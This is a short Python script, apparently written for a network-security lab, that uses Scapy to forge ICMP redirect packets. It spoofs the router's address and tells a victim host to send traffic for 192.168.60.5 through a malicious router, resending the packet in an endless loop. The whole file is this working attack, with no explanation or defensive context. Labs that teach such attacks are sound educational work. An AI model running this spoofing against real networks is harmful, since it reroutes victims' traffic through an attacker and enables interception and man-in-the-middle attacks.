#!/usr/bin/python3

from scapy.all import *

router = '10.9.0.11'
victim = '10.9.0.5'
malice_router = '10.9.0.111'

ip = IP(src=router, dst=victim)
icmp = ICMP(type=5, code=1)
icmp.gw = malice_router

ip2 = IP(src=victim, dst='192.168.60.5')
while True:
    send(ip/icmp/ip2/ICMP())
